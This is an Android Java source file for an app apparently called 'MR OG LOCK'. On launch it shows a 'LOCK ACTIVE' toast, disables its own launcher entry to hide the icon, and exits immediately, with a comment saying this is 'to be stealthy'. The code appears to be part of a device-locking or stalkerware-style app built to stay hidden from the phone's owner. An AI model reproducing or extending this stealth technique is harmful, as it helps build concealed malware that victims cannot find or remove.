package com.mrog.admin;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Simple UI or just a toast
        Toast.makeText(this, "MR OG LOCK ACTIVE - 2026", Toast.LENGTH_LONG).show();

        // HIDE ICON
        try {
            android.content.pm.PackageManager p = getPackageManager();
            android.content.ComponentName componentName = new android.content.ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(componentName,
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
        }

        finish(); // Close immediately to be stealthy
    }
}
